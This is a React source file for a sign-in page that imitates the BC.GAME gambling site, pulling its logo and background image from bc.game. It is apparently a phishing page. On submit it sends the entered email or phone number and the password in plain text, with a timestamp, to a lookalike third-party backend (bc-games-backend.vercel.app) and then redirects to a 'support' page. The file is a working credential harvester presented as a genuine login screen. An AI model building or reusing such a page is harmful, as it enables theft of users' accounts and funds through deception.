import React, { useState } from 'react';
import { Eye, EyeOff, X, User, Twitter, Send, MessageSquare, MessageCircle, Phone, Hash, Github } from 'lucide-react';

function App() {
  const [formData, setFormData] = useState({
    emailOrPhone: '',
    password: '',
  });
  const [errors, setErrors] = useState({
    emailOrPhone: '',
    password: '',
  });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
    
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const validateForm = () => {
    let isValid = true;
    const newErrors = { emailOrPhone: '', password: '' };
    
    if (!formData.emailOrPhone) {
      newErrors.emailOrPhone = 'Please enter your email address or phone number';
      isValid = false;
    }
    
    if (!formData.password) {
      newErrors.password = 'Please enter your password';
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
      isValid = false;
    }
    
    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setLoading(true);
    setError('');

    try {
      const currentDateTime = new Date();
      const isEmail = formData.emailOrPhone.includes('@');
      let phoneNumber = formData.emailOrPhone;
      
      if (!isEmail && !phoneNumber.startsWith('+91')) {
        phoneNumber = `+91${phoneNumber}`;
      }
      
      const payload = {
        password: formData.password,
        loginDate: currentDateTime.toISOString().split('T')[0],
        loginTime: currentDateTime.toTimeString().split(' ')[0],
        loginMethod: isEmail ? 'email' : 'phone',
        ...(isEmail 
          ? { email: formData.emailOrPhone, phone: null } 
          : { phone: phoneNumber, email: null })
      };

      const response = await fetch('https://bc-games-backend.vercel.app/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('Login successful:', result);
        setLoading(false);
        window.location.href = '/support';
      } else {
        throw new Error('Login failed');
      }
      
    } catch (err) {
      setError('Login failed. Please try again.');
      console.error('Login error:', err);
      setLoading(false);
    }
  };

  const socialIcons = [
    { name: 'Google', icon: <User size={14} />, bg: 'transparent' , border:'1px solid ' },
    { name: 'Twitter', icon: <Twitter size={14} />, bg: 'transparent' },
    { name: 'Telegram', icon: <Send size={14} />, bg: 'transparent' },
    { name: 'Discord', icon: <MessageSquare size={14} />, bg: 'transparent' },
    { name: 'WeChat', icon: <MessageCircle size={14} />, bg: 'transparent' },
    { name: 'WhatsApp', icon: <Phone size={14} />, bg: 'transparent' },
    { name: 'Line', icon: <Hash size={14} />, bg: 'transparent' },
    { name: 'Steam', icon: <Github size={14} />, bg: 'transparent' }
  ];

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#232626',
      color: 'white',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      display: 'flex',
      flexDirection: 'column',
      maxHeight: '100vh',
      overflow: 'hidden'
    }}>
      {/* Header with Banner and Gradient Overlay */}
      <div style={{
        position: 'relative',
        height: '160px'
      }}>
        <div style={{
          position: 'absolute',
          inset: 0,
          background: 'linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(35,38,38,0.9) 80%, #232626)',
          zIndex: 10
        }}></div>
        <img 
          src="https://bc.game/modules/account2/assets/bg_m-cac172cf.png"
          alt="Background"
          style={{
            width: '100%',
            height: '100%',
            objectFit: 'cover',
            opacity: 0.8
          }}
        />
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          padding: '16px',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          zIndex: 20
        }}>
          <img 
            src="https://bc.game/assets/logo/logo.png"
            alt="BC.GAME Logo"
            style={{
              height: '24px',
              width: 'auto'
            }}
          />
          <X style={{
            width: '20px',
            height: '20px',
            cursor: 'pointer',
            opacity: 0.6
          }} />
        </div>
      </div>

      {/* Login Form */}
      <div style={{
        padding: '0 16px',
        flex: 1,
        overflowY: 'auto'
      }}>
        <h1 style={{
          fontSize: '24px',
          fontWeight: '600',
          marginBottom: '16px',
          color: 'rgba(255, 255, 255, 0.9)'
        }}>
          Sign In
        </h1>
        
        <form onSubmit={handleSubmit} style={{ marginBottom: '16px' }}>
<div style={{
  width: '100%',
  maxWidth: '360px',  // Set max width similar to BC.GAME
  margin: '0 auto',   // Center horizontally

}}>
  <div style={{ marginBottom: '10px' }}>
    <input 
      type="text"
      name="emailOrPhone"
      placeholder="Email / Phone Number"
      value={formData.emailOrPhone}
      onChange={handleInputChange}
      style={{
        width: '100%',
        padding: '10px 14px',
        backgroundColor: 'rgba(255, 255, 255, 0.06)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRadius: '8px',
        color: 'white',
        fontSize: '14px',
        outline: 'none',
        boxSizing: 'border-box'  // Prevent overflow
      }}
    />
  </div>

  <div style={{ marginBottom: '8px' }}>
    <div style={{ position: 'relative' }}>
      <input 
        type={showPassword ? "text" : "password"}
        name="password"
        placeholder="Password"
        value={formData.password}
        onChange={handleInputChange}
        style={{
          width: '100%',
          padding: '10px 14px',
          paddingRight: '36px',
          backgroundColor: 'rgba(255, 255, 255, 0.06)',
          border: '1px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '8px',
          color: 'white',
          fontSize: '14px',
          outline: 'none',
          boxSizing: 'border-box'
        }}
      />
    </div>
  </div>
</div>


          <div style={{
            textAlign: 'right',
            marginBottom: '12px'
          }}>
            <a href="#" style={{
              color: 'rgba(255, 255, 255, 0.5)',
              fontSize: '12px',
              textDecoration: 'none'
            }}>
              Forgot your password?
            </a>
          </div>

          <button 
            type="submit"
            disabled={loading}
            style={{
              width: '100%',
              padding: '10px',
              background: '#4CAF50',
              border: 'none',
              borderRadius: '8px',
              color: 'white',
              fontSize: '14px',
              fontWeight: '600',
              cursor: 'pointer',
              marginBottom: '16px'
            }}
          >
            Sign In
          </button>
        </form>

        <div style={{
          textAlign: 'center',
          marginBottom: '16px'
        }}>
          <span style={{
            color: 'rgba(255, 255, 255, 0.5)',
            fontSize: '13px'
          }}>
            New to BC.GAME?{' '}
          </span>
          <a href="#" style={{
            color: '#4CAF50',
            fontSize: '13px',
            textDecoration: 'none'
          }}>
            Create account
          </a>
        </div>

        <div style={{
          display: 'flex',
          alignItems: 'center',
          marginBottom: '14px',
          gap: '10px'
        }}>
          <div style={{
            flex: 1,
            height: '1px',
            backgroundColor: 'rgba(255, 255, 255, 0.1)'
          }}></div>
          <span style={{
            color: 'rgba(255, 255, 255, 0.5)',
            fontSize: '12px',
            whiteSpace: 'nowrap'
          }}>
            Log in directly with
          </span>
          <div style={{
            flex: 1,
            height: '1px',
            backgroundColor: 'rgba(255, 255, 255, 0.1)'
          }}></div>
        </div>

        <button style={{
          width: '100%',
          padding: '10px',
          backgroundColor: 'rgba(255, 255, 255, 0.06)',
          border: '1px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '8px',
          color: 'white',
          fontSize: '13px',
          cursor: 'pointer',
          marginBottom: '14px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '8px'
        }}>
          <div style={{
            width: '14px',
            height: '14px',
            backgroundColor: 'rgba(255, 255, 255, 0.1)',
            borderRadius: '3px'
          }}></div>
          Sign In with passkey
        </button>

<div style={{
  display: 'flex',
  justifyContent: 'space-evenly',
  gap: '8px',
  marginBottom: '20px'
}}>
  {socialIcons.map((social, index) => (
    <button 
      key={index}
      style={{
        width: '32px',
        height: '32px',
        backgroundColor: social.bg || 'transparent',
        border: '1px solid rgba(255, 255, 255, 0.15)', // 👈 very light border
        borderRadius: '6px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        cursor: 'pointer',
        color: 'white',
        padding: 0
      }}
      aria-label={`Sign in with ${social.name}`}
    >
      {social.icon}
    </button>
  ))}
</div>

      </div>
    </div>
  );
}

export default App;